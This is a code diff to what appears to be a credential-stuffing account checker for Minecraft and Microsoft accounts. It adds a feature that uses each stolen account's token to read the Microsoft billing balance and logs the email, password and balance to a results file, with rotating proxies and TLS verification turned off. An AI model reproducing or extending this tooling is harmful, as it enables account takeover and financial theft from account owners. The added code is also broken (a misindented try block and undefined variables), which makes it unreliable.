@@ -64,6 +64,7 @@ class Capture:
         self.banned = None
         self.namechanged = None
         self.lastchanged = None
+        self.balance = None
 
     def builder(self):
         message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
@@ -78,6 +79,7 @@ class Capture:
         if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
         if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
         if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
+        if self.balance != None: message+=f"\nMicrosoft Balance: {self.balance}"
         return message+"\n============================\n"
 
     def notify(self):
@@ -255,6 +257,32 @@ class Capture:
                 except: pass
                 if self.banned != None: break
                 tries+=1
+                 
+    def check_balance(self):
+        global errors
+        if config.get('balance') is True:
+            tries = 0
+            while tries < maxretries:
+            try:
+                check = requests.get('https://account.microsoft.com/billing/payments', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
+                if check.status_code == 200:
+                    if 'availableBalance' in check.text:
+                        balance = re.search(r'"availableBalance":\s*"([^"]+)"', check.text)
+                        if balance:
+                            self.balance = balance.group(1)
+                            with open(f"results/{fname}/balanced.txt", 'a') as f:
+                                f.write(f"{self.email}:{self.password} | Balance: {self.balance}\n")
+                    break
+                elif check.status_code == 429:
+                    if len(proxylist) < 5: 
+                        time.sleep(20)
+                    session.proxy = getproxy()
+                    continue
+                else:
+                    break
+            except:
+                tries += 1
+                retries += 1
 
     def handle(self):
         global hits
@@ -664,6 +692,7 @@ Last Name Change: <lastchanged>'''}
     config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
     config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
     config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
+    config.set('balance', str_to_bool(read_config['Captures']['Microsoft Balance']))
 
 def get_proxies():
     global proxylist
